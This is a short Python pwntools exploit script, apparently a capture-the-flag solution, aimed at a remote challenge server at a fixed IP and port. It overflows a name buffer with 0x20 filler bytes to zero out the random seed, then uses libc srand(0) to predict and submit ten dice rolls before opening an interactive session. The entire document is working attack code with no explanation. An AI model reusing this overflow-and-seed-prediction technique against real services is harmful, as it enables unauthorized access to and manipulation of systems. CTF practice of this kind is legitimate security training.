from ctypes import *
from pwn import *
context.log_level = 'debug'
libc=cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
p="./elf"

context.binary=p
#io=process(p)
io=remote("111.198.29.45",46976)

payload=0x20*"a"+p64(0)
io.sendlineafter("name:",payload)
libc.srand(0)
for i in range(10):
    io.sendlineafter("number:",str(libc.rand()%6+1))
    print(io.recv())
io.interactive()
